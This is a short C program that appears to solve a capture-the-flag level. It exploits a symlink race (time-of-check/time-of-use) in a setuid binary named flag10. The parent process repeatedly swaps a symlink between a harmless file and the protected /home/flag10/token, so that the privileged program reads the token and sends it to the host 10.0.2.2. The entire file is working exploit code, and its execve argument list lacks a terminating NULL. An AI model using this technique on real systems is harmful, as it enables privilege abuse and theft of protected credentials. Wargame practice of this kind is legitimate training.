#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

#define DUMMY     "/home/level10/foo_token"
#define STEALFILE "/home/flag10/token"
#define TOKEN_LN  "/home/level10/ln_token"
#define VULN_EXEC "/home/flag10/flag10"
#define HOST_IP   "10.0.2.2"

int main(int argc, char **argv) {
    pid_t child;
    int status;

    char *const flag_args[] = {
        "flag10",
        TOKEN_LN,
        HOST_IP
    };
    if (unlink(TOKEN_LN) < 0) {
        printf("unlink failed!\n");
        exit(-1);
    }
    sync();
    if (symlink(DUMMY, TOKEN_LN) < 0) {
        printf("symlink failed!\n");
        exit(-1);
    }

    sync();
    if ((child = fork()) == 0) {
        if(execve(VULN_EXEC, flag_args, NULL) < 0) {
            printf("execve failed!\n");
            exit(-1);
        }
    } else {
        for (;;) {
            usleep(100);
            unlink(TOKEN_LN);
            sync();
            symlink(STEALFILE, TOKEN_LN);
            sync();
            waitpid(child, &status, 0);

            status = WEXITSTATUS(status);
            if (status != EXIT_FAILURE && status != 1) {
                printf(".");
                break;
            }
        }
    }
}
